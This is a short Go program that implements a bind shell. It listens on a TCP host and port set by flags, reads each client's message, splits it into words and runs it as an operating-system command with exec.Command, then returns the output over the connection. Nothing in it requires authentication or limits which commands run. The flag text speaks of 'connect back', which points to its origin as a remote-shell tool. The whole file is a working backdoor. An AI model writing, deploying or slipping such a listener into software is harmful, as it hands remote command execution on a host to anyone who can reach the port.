package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"os/exec"
	"strings"
)

func main() {
	var host, port string

	flag.StringVar(&host, "host", "localhost", "host to connect back to")
	flag.StringVar(&port, "port", "8080", "port to connect back to")

	flag.Parse()

	target := host + ":" + port
	fmt.Println("listening on: ", target)

	serv, err := net.Listen("tcp", target)
	defer serv.Close()
	if err != nil {
		log.Fatalf("encountered error starting server: %s", err)
	}
	for {
		fmt.Println("accepting connections")
		conn, err := serv.Accept()
		if err != nil {
			log.Fatalf("encountered an error accepting connections: %s", err)
		}
		defer serv.Close()
		fmt.Println("accepted connection")

		go func(c net.Conn) {
			defer c.Close()

			buff := make([]byte, 1024)
			size, _ := c.Read(buff)
			msg := buff[:size]
			fmt.Printf("GOT: %s\n", msg)

			var out strings.Builder
			vals := parse(string(msg))

			if len(vals) > 0 {
				cmd := exec.Command(vals[0], vals[1:]...)
				cmd.Stdout = &out
				if cmdErr := cmd.Run(); cmdErr != nil {
					fmt.Println(cmdErr)
					c.Write([]byte(fmt.Sprintf("%s", cmdErr)))
				} else {
					fmt.Println(out.String())
					c.Write([]byte(out.String()))
				}
			}
		}(conn)
	}
}

// parse cleans the input and returns it as a list of strings
func parse(input string) []string {
	inputList := strings.Split(input, " ")
	var cleaned []string
	for _, v := range inputList {
		if v != "" {
			cleaned = append(cleaned, v)
		}
	}
	return cleaned
}
